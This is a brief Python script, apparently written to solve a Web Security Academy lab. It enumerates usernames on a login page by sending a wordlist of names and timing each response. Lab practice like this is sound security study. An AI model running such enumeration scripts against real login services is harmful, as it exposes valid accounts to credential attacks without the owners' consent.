import requests
import time

# Define the URL
url = "https://0a0200e5039a80a49f06b4da0039002e.web-security-academy.net/login"  # Replace with the actual URL

wordlist_path = "usernames.txt"

# Read the wordlist
with open(wordlist_path, 'r') as file:
    payloads = file.read().splitlines()

# Iterate over each payload in the wordlist
maxx = 0
for payload in payloads:
    # Define the parameters for the POST request
    params = {f'username': {payload}, 'password': 'peter'}
    start = time.time()
    response = requests.post(url, data=params)
    end = time.time()
    diff = end - start

    if response.status_code == 200:
        if maxx == 0:
            maxx = diff 
        print(f" diff: {diff} | response-length: {len(response.text)}")
        maxx = max(diff, maxx)
    else:
        print(response.status_code)

print(maxx)